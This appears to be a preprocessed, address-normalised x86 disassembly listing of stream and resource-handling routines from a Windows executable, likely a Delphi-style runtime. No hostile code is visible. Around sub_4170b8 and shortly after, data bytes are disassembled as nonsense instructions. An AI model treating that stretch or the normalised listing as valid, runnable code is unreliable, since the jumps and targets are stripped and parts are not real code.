push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
sub_4168c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41664c
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026e4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4169a4
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169ab
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_402704
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_416858
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_416890
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_4169bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417040
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416a0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_419074
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a13
mov eax [ ebp - 0x8 ]
call sub_403294
retn
sub_416a1c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_416a78
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408388
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_416ab8
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cb9c
pop ebx
pop ebp
retn 0x8
sub_416ae0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_416b24
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_416b24
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_416c4d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
movzx edx di
mov eax esi
call sub_4082ac
mov ecx eax
xor edx edx
mov eax ebx
call sub_416a1c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408328
mov ecx eax
xor edx edx
mov eax ebx
call sub_416a1c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c54
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_404074
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408558
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40ad88
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408558
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40ad88
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
jmp r-xdata
sub_416c54
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_416c78
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
call sub_4083c0
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_416cb4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028e0
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_416cec
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_416d10
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_416d3c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_416d54
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41664c
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_416858
sub_416d8c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_416cac
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_416db4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_416d8c
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_416de0
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_4069d0
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_4069b4
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_4069a4
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
test ecx ecx
jne r-xdata
sub_416e6c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028e0
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_416d8c
sub_416ebc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404510
mov ecx eax
mov edx esi
mov eax edi
call sub_416f84
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_416f14
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_416f77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f7e
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_416f84
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_416f14
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_416cac
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_416f14
pop ecx
sub_416ff0
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4069a0
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_417040
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026e4
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_417088
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_402704
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4170b8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x71
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
jno r-xdata
inc eax
add [ eax + eax ] dl
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax ] bl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x722c0040 ] al
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc al 0x0
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x723c0040 ] al
inc ecx
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
js r-xdata
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_4040a4
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_4040a4
mov eax esi
test bl bl
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x41 ] bh
add [ eax ] bl
add [ eax ] al
add [ eax + esi * 2 + 0x34c40041 ] dh
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404140
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4045b0
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_4035a0
sub_41718c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_4040a4
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_4040a4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4171e4
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404140
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4045b0
mov al 0x1
inc ebx
sub_41723c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4172b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40568c
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4112a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4172ba
lea eax [ ebp - 0x4 ]
call sub_40568c
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_410b60
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_40568c
mov ecx eax
mov eax esi
pop edx
call sub_40d1d0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_40568c
sub_4172c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_417366
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41736d
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404140
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41ae4c
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407d14
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_417388
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4141cc
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4141cc
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_414014
sub_4173c0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4141cc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4141cc
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_414060
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_414014
sub_417408
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_4175a1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_414534
mov edi eax
xor edx edx
push ebp
push sub_417582
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417589
mov eax [ rw-data ]
call sub_414598
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_417563
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_417511
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_414170
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413cbc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417518
mov eax [ ebp - 0x8 ]
call sub_403294
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410ce0
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_417388
pop ecx
mov edx esi
mov eax edi
call sub_414060
mov eax ebx
call sub_403294
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4172c0
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_4173c0
pop ecx
inc esi
sub_417518
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403294
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414170
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
sub_4175b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_414534
mov edi eax
xor eax eax
push ebp
push sub_41764b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414598
retn
mov edx ebx
mov eax edi
call sub_414170
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_414060
mov eax esi
call sub_403294
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407d14
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41765c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_414534
mov edi eax
xor eax eax
push ebp
push sub_4176d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414598
retn
mov edx ebx
mov eax edi
call sub_414170
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_414060
mov eax esi
call sub_403294
sub_417704
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
pop ecx
pop edx
pop ebx
retn
sub_417748
push ebx
push esi
push edi
call sub_403608
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417088
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_417784
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41965c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41976c
call sub_4176f8
sub_4177a8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407d14
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404050
sub_4177dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407d14
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41965c
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41789d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_417c20
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_417c20
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178a4
mov eax [ ebp - 0x8 ]
call sub_403294
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41976c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_4176f8
sub_4178cc
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_4178ec
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4042ec
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403500
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_4176f8
sub_417954
push ebp
mov ebp esp
